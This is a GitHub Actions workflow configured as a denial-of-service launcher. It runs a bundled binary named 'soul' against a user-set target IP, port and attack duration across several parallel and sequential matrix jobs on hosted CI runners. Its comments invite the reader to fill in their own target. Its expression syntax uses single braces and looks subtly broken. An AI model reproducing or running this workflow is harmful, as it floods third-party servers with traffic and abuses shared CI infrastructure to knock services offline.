name: soulcrack fucker
on: 
  push:
    branches: [ "main", "master" ]
  workflow_dispatch: # Allows manual triggering

env:
  # Replace these with your actual values
  TARGET_IP: "192.168.1.1"  # Change this to your target IP
  TARGET_PORT: "80"          # Change this to your target port
  ATTACK_DURATION: "400"      # Change this to your desired duration

jobs:
  stage-0:
    runs-on: ubuntu-22.04
    strategy:
      matrix:
        n: [1, 2, 3, 4, 5]
    steps:
      - name: Checkout code
        uses: actions/checkout@v3
      
      - name: Install cpulimit
        run: |
          sudo apt-get update
          sudo apt-get install -y cpulimit
          
      - name: Run with 50% CPU limit
        run: |
          chmod +x soul
          cpulimit -l 50 -- ./soul ${ env.TARGET_IP } ${ env.TARGET_PORT } 10 400

  stage-1:
    needs: stage-0
    runs-on: ubuntu-22.04
    strategy:
      matrix:
        n: [1, 2, 3, 4, 5]
    steps:
      - name: Checkout code
        uses: actions/checkout@v3
      
      - name: Install cpulimit
        run: |
          sudo apt-get update
          sudo apt-get install -y cpulimit
          
      - name: Run with 50% CPU limit
        run: |
          chmod +x soul
          cpulimit -l 50 -- ./soul ${ env.TARGET_IP } ${ env.TARGET_PORT } ${ env.ATTACK_DURATION } 400

  stage-2-calc:
    runs-on: ubuntu-latest
    outputs:
      matrix_list: ${ steps.calc.outputs.matrix_list }
    steps:
      - name: Calculate matrix
        id: calc
        run: |
          NUM_JOBS=$((${ env.ATTACK_DURATION } / 10))
          echo "Creating $NUM_JOBS jobs..."
          ARRAY=$(seq 1 $NUM_JOBS | jq -R . | jq -s -c .)
          echo "matrix_list=$ARRAY" >> $GITHUB_OUTPUT
          echo "Matrix: $ARRAY"

  stage-2-sequential:
    needs: [stage-0, stage-2-calc]
    runs-on: ubuntu-22.04
    strategy:
      max-parallel: 1
      matrix:
        iteration: ${ fromJSON(needs.stage-2-calc.outputs.matrix_list) }
    steps:
      - name: Checkout code
        uses: actions/checkout@v3
      
      - name: Install cpulimit
        run: |
          sudo apt-get update
          sudo apt-get install -y cpulimit
          
      - name: Sequential 10s Burst with 50% CPU limit
        run: |
          chmod +x soul
          echo "Running iteration ${ matrix.iteration } of ${ env.ATTACK_DURATION }"
          cpulimit -l 50 -- ./soul ${ env.TARGET_IP } ${ env.TARGET_PORT } 10 400
